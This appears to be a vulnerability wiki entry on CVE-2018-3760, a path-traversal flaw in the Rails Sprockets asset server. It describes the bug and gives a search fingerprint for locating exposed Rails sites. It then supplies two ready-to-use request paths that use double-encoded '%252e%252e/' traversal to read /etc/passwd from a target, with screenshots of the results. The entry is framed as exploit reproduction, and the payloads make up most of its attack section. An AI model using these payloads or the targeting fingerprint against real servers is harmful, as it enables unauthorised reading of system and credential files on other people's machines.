# Rails sprockets Arbitrary file reading vulnerability CVE-2018-3760

## Vulnerability Description

Ruby On Rails uses Sprockets as a static file server in the development environment. Ruby On Rails is a famous Ruby Web development framework. Sprockets is a Ruby library for compiling and distributing static resource files.

In Sprockets 3.7.1 and previous versions, there was a path-travel vulnerability caused by secondary decoding. Attackers can use %252e%252e/ to span to the root directory, read or execute any file on the target server.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Sprockets < 3.7.1</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">title="Ruby On Rails"</span>

## Vulnerability reappears

Main page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1656041292346-1069b91e-aa5e-4d53-821a-9150720e9b5e.png)

Get the absolute path first

```php
/assets/file:%2f%2f/etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1656041358544-854ca040-261f-474f-86fc-61a8558e4238.png)

Use POC to read files

```php
/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1656041483857-17cdbe06-5526-4b80-9189-b4ec9ea0b834.png)